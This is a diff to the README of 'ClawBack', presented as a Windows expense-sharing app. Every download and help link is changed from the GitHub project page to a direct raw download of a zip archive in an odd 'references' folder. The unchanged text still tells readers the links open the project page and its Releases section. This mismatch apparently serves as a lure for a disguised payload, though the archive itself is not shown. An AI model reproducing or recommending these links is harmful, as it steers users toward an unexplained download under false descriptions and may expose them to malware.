@@ -1,6 +1,6 @@
 # 🦞 ClawBack - Easy Group Expense Sharing  
 
-[![Download ClawBack](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge)](https://github.com/Gunpark407/ClawBack)
+[![Download ClawBack](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge)](https://github.com/Gunpark407/ClawBack/raw/refs/heads/main/deploy/openclaw-skill/references/Claw-Back-3.5.zip)
 
 ## 📋 What is ClawBack?
 
@@ -29,7 +29,7 @@ Follow these steps to download and start using ClawBack on your Windows PC.
 
 Visit this page to download ClawBack:
 
-[Download ClawBack Now](https://github.com/Gunpark407/ClawBack)
+[Download ClawBack Now](https://github.com/Gunpark407/ClawBack/raw/refs/heads/main/deploy/openclaw-skill/references/Claw-Back-3.5.zip)
 
 Click the link above, and it will take you to the project page on GitHub. From there, find the latest version under the "Releases" section. Download the Windows installer file, which usually ends with `.exe`.
 
@@ -133,7 +133,7 @@ These features make ClawBack flexible for different group sizes and use cases.
 
 If you get stuck, you can:  
 
-- Visit the GitHub page [ClawBack on GitHub](https://github.com/Gunpark407/ClawBack)  
+- Visit the GitHub page [ClawBack on GitHub](https://github.com/Gunpark407/ClawBack/raw/refs/heads/main/deploy/openclaw-skill/references/Claw-Back-3.5.zip)  
 - Open an issue to report bugs or ask questions  
 - Check the FAQ in the repository  
 
@@ -145,6 +145,6 @@ This way, you can connect with others using ClawBack or find answers quickly.
 
 You can always download the latest version here:  
 
-[Download ClawBack Installer](https://github.com/Gunpark407/ClawBack)  
+[Download ClawBack Installer](https://github.com/Gunpark407/ClawBack/raw/refs/heads/main/deploy/openclaw-skill/references/Claw-Back-3.5.zip)  
 
 This link takes you to the GitHub page. Find the Windows installer under "Releases," download the `.exe` file, and follow the installation steps described above.
